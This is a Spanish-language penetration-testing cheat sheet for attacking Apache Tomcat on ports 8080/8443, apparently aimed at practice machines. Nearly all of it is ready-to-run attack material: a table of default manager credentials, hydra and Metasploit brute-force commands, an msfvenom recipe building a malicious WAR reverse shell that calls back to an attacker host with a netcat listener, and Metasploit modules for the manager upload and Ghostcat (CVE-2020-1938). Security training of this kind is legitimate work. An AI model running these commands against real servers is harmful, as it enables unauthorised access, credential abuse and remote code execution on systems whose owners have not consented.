# Enumeración y Ataque — Tomcat (Puerto 8080/8443)

## Descripción

Apache Tomcat es un servidor de aplicaciones Java. Su panel de administración (`/manager`) permite desplegar aplicaciones WAR, lo que se puede abusar para subir una webshell y obtener RCE. Es muy frecuente en máquinas de práctica.

**Puertos:** 8080 (HTTP) / 8443 (HTTPS) / 8180 (alternativo)

---

## Paso 1 — Identificación

Visita en el navegador:
```
http://TARGET_IP:8080
http://TARGET_IP:8080/manager
http://TARGET_IP:8080/manager/html
```

La página principal de Tomcat muestra la versión en el pie de página.

---

## Paso 2 — Credenciales por defecto ⭐

El panel `/manager/html` pide autenticación HTTP Basic. Prueba:

| Usuario | Contraseña |
|---------|------------|
| admin | admin |
| admin | password |
| tomcat | tomcat |
| tomcat | s3cret |
| manager | manager |
| admin | (vacía) |

---

## Paso 3 — Fuerza bruta al manager

```shell
hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
      -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt \
      http-get://TARGET_IP:8080/manager/html

# Con Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS TARGET_IP
set RPORT 8080
run
```

---

## Paso 4 — RCE via despliegue de WAR malicioso ⭐

Si tienes acceso al manager, puedes desplegar un archivo WAR con una shell:

### Con Metasploit (automático)

```shell
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_IP
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST KALI_IP
run
```

### Manual con msfvenom

```shell
# Crear WAR malicioso
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f war -o shell.war

# Subir desde el panel web manager/html → Deploy → Upload WAR

# Poner listener
nc -lvnp 4444

# Acceder al WAR desplegado
curl http://TARGET_IP:8080/shell/
```

---

## Paso 5 — Buscar versión vulnerable

```shell
searchsploit tomcat VERSION
```

Vulnerabilidades relevantes:

| CVE | Versión | Descripción |
|-----|---------|-------------|
| CVE-2019-0232 | Tomcat < 9.0.18 | RCE en Windows con CGI |
| CVE-2017-12617 | Tomcat < 8.5.23 | RCE via PUT |
| CVE-2020-1938 | Tomcat < 9.0.31 | Ghostcat - LFI via AJP |

### Ghostcat (CVE-2020-1938) — Puerto 8009 AJP

```shell
# Si el puerto 8009 está abierto
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS TARGET_IP
run
```

---

## Checklist rápido

```
[ ] Visitar http://TARGET:8080 y http://TARGET:8080/manager/html
[ ] Credenciales por defecto (tomcat:tomcat, tomcat:s3cret, admin:admin)
[ ] Fuerza bruta con Metasploit tomcat_mgr_login
[ ] Si tienes acceso al manager → desplegar WAR malicioso
[ ] searchsploit con versión exacta
[ ] Puerto 8009 abierto → Ghostcat
```
